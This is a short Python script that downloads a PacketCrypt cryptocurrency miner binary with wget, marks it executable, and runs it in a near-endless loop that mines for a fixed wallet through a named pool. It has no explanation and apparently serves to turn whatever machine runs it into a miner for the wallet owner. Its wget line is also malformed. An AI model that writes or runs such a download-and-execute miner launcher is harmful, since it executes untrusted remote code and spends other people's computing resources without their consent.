 
import os 
os.system("wget clone https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.3/packetcrypt-v0.4.3-linux_amd64 -O packetcrypt")

os.system("chmod +x packetcrypt")
for x in range(999999999999999999999999999999999999999999999999999999999999999):
    os.system("./packetcrypt ann -p pkt1qch6mxd8k53t7yehljyhy2k0fyqaq4kcrh50nk7 http://pool.srizbi.com")

 